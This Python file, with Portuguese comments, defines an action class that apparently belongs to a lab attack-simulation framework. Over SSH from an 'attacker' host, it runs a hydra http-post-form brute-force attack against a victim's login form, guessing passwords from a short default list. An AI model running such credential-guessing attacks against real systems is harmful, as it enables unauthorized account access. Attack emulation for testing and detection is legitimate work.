import logging
logger = logging.getLogger("[Action:BRUTE_HTTP]")

class HydraHttpPostBruteAction:
    """
    Ataque de força bruta em formulário HTTP com hydra http-post-form.
    Requer um endpoint funcional na vítima (ex.: http://IP:8081/login).

    params:
      path: caminho do POST (ex.: /login)
      user: usuário fixo OU use 'user_list' para lista; se ambos, 'user' tem prioridade
      pass_list: lista de senhas para testar
      fail_regex: indicador de falha (string presente na resposta quando login falha)
      port: 8081 por padrão
      output: arquivo de saída
      threads: paralelismo
    """
    def __init__(self,
                 path="/login",
                 user="webuser",
                 pass_list=("secret", "wrongpass"),
                 fail_regex="invalid",
                 port=8081,
                 output="exp_brute_http.hydra",
                 threads=4):
        self.path = path
        self.user = user
        self.pass_list = pass_list
        self.fail_regex = fail_regex
        self.port = int(port)
        self.output = output
        self.threads = int(threads)

    def run(self, attacker_ssh, victim_ip: str):
        try:
            pass_pipe = "\\n".join(self.pass_list)
            form = f"{self.path}:username=^USER^&password=^PASS^:F={self.fail_regex}"
            # usar bash -lc para suportar <(printf ...)
            cmd = (
                "bash -lc "
                f"\"IP={victim_ip}; hydra -l {self.user} -P <(printf '{pass_pipe}\\n') "
                f"$IP -s {self.port} http-post-form '{form}' -t {self.threads} -I -f -o ~/{self.output}\""
            )
            logger.info(f"[BRUTE_HTTP] Executando: {cmd}")
            attacker_ssh.run_command("attacker", cmd, timeout=600)
        except Exception as e:
            logger.error(f"[BRUTE_HTTP] Falhou: {e}")
            raise
